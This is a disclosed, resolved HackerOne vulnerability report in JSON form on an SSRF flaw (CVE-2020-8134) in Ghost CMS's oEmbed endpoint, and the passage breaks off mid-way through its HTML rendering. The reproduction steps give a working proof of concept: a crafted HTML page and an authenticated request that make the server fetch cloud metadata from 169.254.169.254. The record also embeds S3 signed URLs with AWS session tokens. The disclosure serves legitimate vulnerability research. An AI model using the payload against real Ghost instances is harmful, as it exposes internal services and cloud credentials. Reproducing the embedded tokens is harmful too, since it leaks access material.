{"id":793704,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTM3MDQ=","url":"https://hackerone.com/reports/793704","title":"Server-Side Request Forgery (SSRF) in Ghost CMS ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-02-11T16:33:58.658Z","submitted_at":"2020-02-11T16:33:58.658Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"whoareme","url":"/whoareme","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/a40cnveew0c5l32vsa2573lvscji/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a?response-content-disposition=inline%3B%20filename%3D%22563170EF-27F4-4176-817B-5C52C262A16C.jpeg%22%3B%20filename%2A%3DUTF-8%27%27563170EF-27F4-4176-817B-5C52C262A16C.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=625218f0f3386bf9e4fa31a77eba12fbe1987115925e196ac938f6b3f2410608"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8134"],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-09T12:21:11.600Z","bug_reporter_agreed_on_going_public_at":"2020-03-09T12:21:11.526Z","team_member_agreed_on_going_public_at":"2020-03-09T12:11:23.352Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report about SSRF vulnerability in CMS Ghost blog\n\nIt allows attacker able to send a crafted GET request from a vulnerable web application\n\n# Module\n\n**module name:** ghost\n**version:** 3.5.2\n**npm page:** `https://www.npmjs.com/package/ghost`\n**website page** `https://ghost.org/`\n\n## Module Description\n\nGhost is the world’s most popular open source headless Node.js CMS. \n\n## Module Stats\n\n4,812 weekly downloads\n\nThis CMS is used around 512,000 times for creating Blogs in 2018 according to Ghost statics. Currently the biggest customers of this blog are: Apple, Elon Musk's OpenAI team, Tinder, DigitalOcean, DuckDuckGo, Mozilla, Airtable, Revolt, etc.\n\n# Vulnerability\nAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a CMS Ghost Blog instance's to internal / external network.\n\n## Vulnerability Description\nCMS Ghost allows publishers to set up embed content from many sources (like Youtube, Twitter, Instagram, etc).\nF713079\n\nWhen click you click on the “Other…” button you can see the following input.\nF713080\nThis input are send request to the route which is vulnerable for the SSRF attack. Let's discover it! \nWhen you try to pass some URL into this input we receive response like that:\n```\nGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json\u0026type=embed\n```\nF713081\nIn my case I trying to receive DigitalOcean MetaData from my server.\n\nBut, sadly In that moment we receive only validation error. That’s because responsible for that function [query()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L145) doesn’t receive any content from function fetchOembedData().\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nmodule.exports = {\n    docName: 'oembed',\n    read: {\n        permissions: false,\n        data: [\n            'url',\n            'type'\n        ],\n        options: [],\n        query({data}) {\n            let {url, type} = data;\n\n            if (type === 'bookmark') {\n                return fetchBookmarkData(url);\n            }\n\n            return fetchOembedData(url).then((response) =\u003e {\n                if (!response \u0026\u0026 !type) {\n                    return fetchBookmarkData(url);\n                }\n                return response;\n            }).then((response) =\u003e {\n                if (!response) {\n                    return unknownProvider(url);\n                }\n                return response;\n            }).catch(() =\u003e {\n                return unknownProvider(url);\n            });\n        }\n    }\n};\n```\nIf we add breakpoint in fetchOembedData() function. And when will go across all lines of code in this function. We will notice interesting function that is call [getOembedUrlFromHTML()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L109)\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nfunction fetchOembedData(url) {\n    let provider;\n    ({url, provider} = findUrlWithProvider(url));\n    if (provider) {\n        return knownProvider(url);\n    }\n    return request(url, {\n        method: 'GET',\n        timeout: 2 * 1000,\n        followRedirect: true,\n        headers: {\n            'user-agent': 'Ghost(https://github.com/TryGhost/Ghost)'\n        }\n    }).then((response) =\u003e {\n        if (response.url !== url) {\n            ({url, provider} = findUrlWithProvider(response.url));\n        }\n        if (provider) {\n            return knownProvider(url);\n        }\n        const oembedUrl = getOembedUrlFromHTML(response.body);\n        if (oembedUrl) {\n            return request(oembedUrl, {\n                method: 'GET',\n                json: true\n            }).then((response) =\u003e {\n                return response.body;\n            }).catch(() =\u003e {});\n        }\n    });\n}\n```\nThis [function](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L70) is responsible for getting oEmbed URL from external resources.\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nconst getOembedUrlFromHTML = (html) =\u003e {\n    return cheerio('link[type=\"application/json+oembed\"]', html).attr('href');\n};\n```\n\u003e\"oEmbed is a format for allowing an embedded representation of a URL on third party sites. The simple API allows a website to display embedded content (such as photos or videos) when a user posts a link to that resource, without having to parse the resource directly.\"\n\nAnd here we can notice before and after executing getOembedUrlFromHTML() function don’t exist any validation which can prevent against from the SSRF attacks.  \n\n## Steps To Reproduce:\n\nCurrently, we know how we can bypass validation in vulnerable route and now we can easily create exploit for this.\n\nFirst of all, we should create an HTML page with  \"link[type=\"application/json+oembed”]” malicious URL which we would like to discover:\n ```\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"UTF-8\"\u003e\n    \u003ctitle\u003eSecurity Testing\u003c/title\u003e\n    \u003clink rel=\"alternate\" type=\"application/json+oembed\" href=\"http://169.254.169.254/metadata/v1.json\"/\u003e\n\u003c/head\u003e\n\u003cbody\u003e\u003c/body\u003e\n\u003c/html\u003e\n```\n\nAnd serve this page by the Python SimpleHTTPServer module:\n \n```python -m SimpleHTTPServer 8000```\n\nIf your target is located in not your local network you can use ngrok library for creating a tunnel to your HTML page.\n \nAnd send the following request with publisher Cookies\n```\nGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json\u0026type=embed HTTP/1.1\nHost: YOUR_WEBSITE\nConnection: keep-alive\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nX-Ghost-Version: 3.5\nApp-Pragma: no-cache\nUser-Agent: Mozilla/5.0\nContent-Type: application/json; charset=UTF-8\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US;\nCookie: ghost-admin-api-session=YOUR_SESSION\n```\nAnd we finally receive a response from the internal DigitalOcean service with my Droplet MetaData. \nSSRF vulnerability is working! 🥳\n\nF713098\n\n## Supporting Material/References:\n- OS: macOS current\n- Node.js: 10.15.2\n- NPM: 6.11.3\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Yes\n- I opened an issue in the related repository: No\n\n## Impact\n\nAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance's to internal / external network.","vulnerability_information_html":"\u003cp\u003eI would like to report about SSRF vulnerability in CMS Ghost blog\u003c/p\u003e\n\n\u003cp\u003eIt allows attacker able to send a crafted GET request from a vulnerable web application\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e ghost\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 3.5.2\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/ghost\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003ewebsite page\u003c/strong\u003e \u003ccode\u003ehttps://ghost.org/\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eGhost is the world’s most popular open source headless Node.js CMS. \u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e4,812 weekly downloads\u003c/p\u003e\n\n\u003cp\u003eThis CMS is used around 512,000 times for creating Blogs in 2018 according to Ghost statics. Currently the biggest customers of this blog are: Apple, Elon Musk\u0026#39;s OpenAI team, Tinder, DigitalOcean, DuckDuckGo, Mozilla, Airtable, Revolt, etc.\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003cp\u003eAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a CMS Ghost Blog instance\u0026#39;s to internal / external network.\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eCMS Ghost allows publishers to set up embed content from many sources (like Youtube, Twitter, Instagram, etc).\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"2020-02-11_17.06.04.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8R6BtYCJ4Ci28myo5foMTcNe?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.04.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.04.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065414Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=99a6e6888ab6dd4c24d3a2dc38cbd904f0e1d7a24504b7418ec5d186debd2356\" data-attachment-type=\"image/jpeg\"\u003e2020-02-11_17.06.04.jpg (F713079)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen click you click on the “Other…” button you can see the following input.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"2020-02-11_17.06.41.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QXGSvBzFWe67r3pREuWmynY2?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.41.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.41.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065414Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=7800f6412d2cb8ee4ebeb97060ee36dfaa53ff59fcb674eecac470cfbca32b5b\" data-attachment-type=\"image/jpeg\"\u003e2020-02-11_17.06.41.jpg (F713080)\u003c/a\u003e\u003cbr\u003e\nThis input are send request to the route which is vulnerable for the SSRF attack. Let\u0026#39;s discover it! \u003cbr\u003e\nWhen you try to pass some URL into this input we receive response like that:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json\u0026amp;type=embed\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"2020-02-11_17.56.17.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GGRKvEzhgCvMW6nYeGGkHkPZ?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.56.17.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.56.17.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065414Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=d88385627740f2a525d66a54fc202f57ed9902836959d5ed8690d1ae5cedc8ea\" data-attachment-type=\"image/jpeg\"\u003e2020-02-11_17.56.17.jpg (F713081)\u003c/a\u003e\u003cbr\u003e\nIn my case I trying to receive DigitalOcean MetaData from my server.\u003c/p\u003e\n\n\u003cp\u003eBut, sadly In that moment we receive only validation error. That’s because responsible for that function \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FTryGhost%2FGhost%2Fblob%2Fmaster%2Fcore%2Fserver%2Fapi%2Fcanary%2Foembed.js%23L145\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003equery()\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e doesn’t receive any content from function fetchOembedData().\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eGhost\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecore\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eapi\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecanary\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eoembed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003emodule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexports\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003edocName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eoembed\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"na\"\u003epermissions\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n            \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eurl\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003etype\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e],\u003c/span\u003e\n        \u003cspan class=\"na\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[],\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003equery\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ebookmark\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efetchBookmarkData\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efetchOembedData\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003efetchBookmarkData\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan 